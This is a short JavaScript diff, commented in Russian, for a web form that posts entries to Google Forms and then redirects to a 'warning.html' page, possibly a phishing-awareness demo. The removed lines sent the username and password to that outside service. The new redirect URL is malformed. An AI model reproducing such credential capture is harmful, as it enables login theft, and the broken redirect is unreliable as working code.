@@ -120,8 +120,6 @@
             // Получаем данные формы
             const formData = {
                 lastname: document.getElementById('lastname').value,
-                username: document.getElementById('username').value,
-                password: document.getElementById('password').value
             };
             
             // Отправляем данные в Google Forms
@@ -137,7 +135,7 @@
             })
             .then(() => {
                 // Перенаправление после успешной отправки
-                window.location.href = 'https://example.com/warning.html';
+                window.location.href = 'https:/warning.html';
             })
             .catch((error) => {
                 console.error('Ошибка:', error);
